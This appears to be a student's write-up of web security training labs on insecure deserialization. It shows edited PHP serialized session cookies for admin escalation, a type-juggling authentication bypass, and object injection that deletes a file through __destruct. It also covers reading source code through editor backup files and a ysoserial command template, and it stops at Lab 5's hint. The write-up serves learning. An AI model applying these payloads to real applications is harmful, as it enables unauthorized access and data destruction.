
# Lab 1

## Description

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

When logging in with `wiener:peter` the cookie shows:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

the value boolean `b:0` determines if the user is an admin or not. Changing it to:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

gives the user access to the admin panel:

```
/admin
```

which let's the user delete any user, in this case deleting `carlos`:

```
/admin/delete?username=carlos
```

solves the challenge.


# Lab 2

## Description

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Hint

To access another user's account, you will need to exploit a quirk in how PHP compares data of different types.

Note that PHP's comparison behavior differs between versions. This lab assumes behavior consistent with PHP 7.x and earlier.

(this is hints to JSON login bypass)

## Solution

Change cookie value from:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"rr43xm6t86cc45ccvmk2s0n0903u1vyh";}
```

to:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

Explanation:

- change username to `Administrator` (tested with `Admin` as well but it didn't work)
- change `string` length to `13` (username length)
- change `access_token` length to `0`
- remove quotes and change `string` type to `int` -> `i`



# Lab 3

## Description

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

You also have access to a backup account: `gregg:rosebud`

## Solution

After logging in the user can upload a profile picture. Testing with a random `txt` file responds with:

```
<pre>PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:24
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/path.txt', 'text/plain')
#1 {main}
  thrown in /home/carlos/User.php on line 24
</pre>

```

which discloses the full paths of:
- the php script responsible for the upload
- the directory where will be saved

Furthermore (it being a deserialization lab), the cookie shows following value when logged in as user `wiener`:

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"b3w5cywpdqny7birb3r88jlc84x4wby1";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

Using `avatar_link` the file `morale.txt` could potentially be overwritten but it didn't work. 

The description says to `delete` the file -> this is a hint to use `delete` functions which the server gives via the user delete function `POST /my-account/delete`.

This didn't work on the first attempt, using the `gregg` user here and changing this:

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ilq8nbp0do6tw957ls76q51qhh8tm9d7";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```

to this:

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ilq8nbp0do6tw957ls76q51qhh8tm9d7";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```


# Lab 4

## Description

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: `wiener:peter`

### Hint

You can sometimes read source code by appending a tilde (`~)` to a filename to retrieve an editor-generated backup file.

## Solution

After logging in the source code reveals:

```
[...]
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated 
[...]
```

Heading to it:

```
GET /libs/CustomTemplate.php
```

returns:

```
HTTP/2 200 OK
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Using the hint with:

```
GET /libs/CustomTemplate.php~
```

shows the php source code.

**NOTE:** This behavior is due to editors like vim, emacs or nano saving a backup copy in the same directory of the file. This backup file is sometimes saved as `file.php~`. The server doesn't see that as a `php` file thus doesn't execute it and prints it out to the user.

Looking at the source code:

```
[...]
   function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
[...]
```

transforming the cookie from:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"r68myh4nbg158cfsnllpqaybaos95gwq";}
```

to:

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

This triggers the `__destruct()` magic function with `lock_file_path` and sends the path `/home/carlos/morale.txt`.

Needs revision and sometime to grasp the concept.

Maybe they are some blog posts or books on this to clarify the subject?


# Lab 5

## Description

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

### Hint

In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example:

```
java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ [payload] '[command]'
```
